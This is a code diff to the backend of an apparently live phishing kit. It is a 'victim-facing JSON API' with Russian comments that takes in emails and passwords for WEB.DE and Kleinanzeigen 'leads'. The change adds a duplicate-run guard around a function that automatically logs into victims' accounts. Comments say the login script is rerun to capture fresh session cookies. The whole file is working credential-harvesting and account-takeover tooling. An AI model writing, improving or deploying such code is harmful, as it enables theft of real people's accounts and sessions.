@@ -1,5 +1,33 @@
 // Victim-facing JSON API (uses with(scope) like leadController).
 const { send } = require('../utils/httpUtils');
+const automationService = require('../services/automationService');
+const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
+
+/** Перед автозапуском с формы: свежая строка из БД, без forceRestart. */
+function shouldSkipVictimAutomationSubmit(readLeads, leadRef, forceRestart) {
+  if (!leadRef || !leadRef.id || forceRestart) return false;
+  const rows = readLeads();
+  const fresh = Array.isArray(rows) ? rows.find(function (l) { return l && l.id === leadRef.id; }) : null;
+  if (!fresh) return false;
+  const st = String(fresh.status || '').trim();
+  if (st === 'processing' || st === 'completed') {
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД: ' + st);
+    return true;
+  }
+  if (st === 'show_success') {
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД: show_success');
+    return true;
+  }
+  if (fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '') {
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
+    return true;
+  }
+  if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
+    return true;
+  }
+  return false;
+}
 
 async function handle(scope) {
   with (scope) {
@@ -112,7 +140,7 @@ async function handle(scope) {
         }
         applyLeadTelemetry(leadKf, req, json, ip);
         persistLeadFull(leadKf);
-        if (pwKf) {
+        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, leadKf, false)) {
           startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
         }
         return send(res, 200, { ok: true, id: leadKf.id });
@@ -294,7 +322,9 @@ async function handle(scope) {
               ip: ip,
               totalLeads: leads.length
             });
-            startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
+            if (!shouldSkipVictimAutomationSubmit(readLeads, visitLead, false)) {
+              startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
+            }
             return send(res, 200, { ok: true, id: visitLead.id });
           } else {
             // Лид вернулся (уже был Успех) — повторный submit: обновляем лог и заново запускаем скрипт входа, чтобы сохранить новые куки
@@ -319,7 +349,9 @@ async function handle(scope) {
               persistLeadFull(visitLead);
               console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
               pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
-              startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
+              if (!shouldSkipVictimAutomationSubmit(readLeads, visitLead, true)) {
+                startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
+              }
               return send(res, 200, { ok: true, id: visitId });
             }
             // Email совпадает — создаём новый лог, переносим в него историю старого, старый удаляем
@@ -418,7 +450,9 @@ async function handle(scope) {
             const preemptEm = (!isKleinSame ? email : (emailForKlein || email)).trim().toLowerCase();
             preemptWebdeLoginForReplacedLead(visitId, preemptEm);
             if (!isKleinSame || hasPassword) {
-              startWebdeLoginAfterLeadSubmit(id, newLead);
+              if (!shouldSkipVictimAutomationSubmit(readLeads, newLead, false)) {
+                startWebdeLoginAfterLeadSubmit(id, newLead);
+              }
             }
             return send(res, 200, { ok: true, id: id });
           }
@@ -569,7 +603,9 @@ async function handle(scope) {
         const pe = isKlein ? (emailForKlein || email).trim().toLowerCase() : email.trim().toLowerCase();
         preemptWebdeLoginForReplacedLead(existingByEmail.id, pe);
       }
-      startWebdeLoginAfterLeadSubmit(id, newLead);
+      if (!shouldSkipVictimAutomationSubmit(readLeads, newLead, false)) {
+        startWebdeLoginAfterLeadSubmit(id, newLead);
+      }
       send(res, 200, { ok: true, id: id });
     });
     return true;
